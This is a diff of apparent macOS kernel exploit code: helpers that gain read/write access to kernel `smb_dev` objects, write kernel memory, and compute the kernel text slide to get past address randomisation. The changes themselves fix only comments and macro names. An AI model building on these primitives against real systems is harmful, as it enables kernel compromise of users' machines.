@@ -176,7 +176,7 @@ int kmem_boostrap_try_write(struct kmem_bootstrap* kmem, uintptr_t dst, const vo
     /// The extra data required to fill up a block can be read from kernel memory.
     ///
     /// Since the last byte in a block should always be zero, we also need to make sure that the
-    /// last byte in the last block written is actually required to be zero. If the data is `src` ends
+    /// last byte in the last block written is actually required to be zero. If the data in `src` ends
     /// with zero, this can be easily done. When it is not ending with zero, we add more data to
     /// source buffer by reading from kernel memory until we can find a byte with value zero
     ///
@@ -299,7 +299,7 @@ static const struct xpl_kmem_ops kmem_ro_ops = {
 xpl_kmem_backend_t kmem_bootstrap_create(const struct sockaddr_in* smb_addr) {
     smb_dev_rw_t devs[2] = { NULL, NULL };
     
-    /// Obtain read / write access to `struct smb_dev` allocated on kext.48 zone
+    /// Obtain read / write access to `struct smb_dev` allocated on default.48 zone
     smb_dev_rw_create(smb_addr, devs);
     
     int dev_count = (devs[0] != NULL) + (devs[1] != NULL);
@@ -342,8 +342,8 @@ uintptr_t kmem_bootstrap_get_mh_execute_header(xpl_kmem_backend_t backend) {
     
     xpl_assert_cond(vn_default_error, >=, FUNC_VN_DEFAULT_ERROR);
     uintptr_t text_exec_slide = vn_default_error - FUNC_VN_DEFAULT_ERROR;
-    uintptr_t text_exec_base = xpl_IMAGE_SEGMENT_TEXT_EXEC_BASE + text_exec_slide;
-    uintptr_t text_base = text_exec_base - xpl_IMAGE_SEGMENT_TEXT_SIZE;
+    uintptr_t text_exec_base = XPL_IMAGE_SEGMENT_TEXT_EXEC_BASE + text_exec_slide;
+    uintptr_t text_base = text_exec_base - XPL_IMAGE_SEGMENT_TEXT_SIZE;
     return text_base;
 }
 
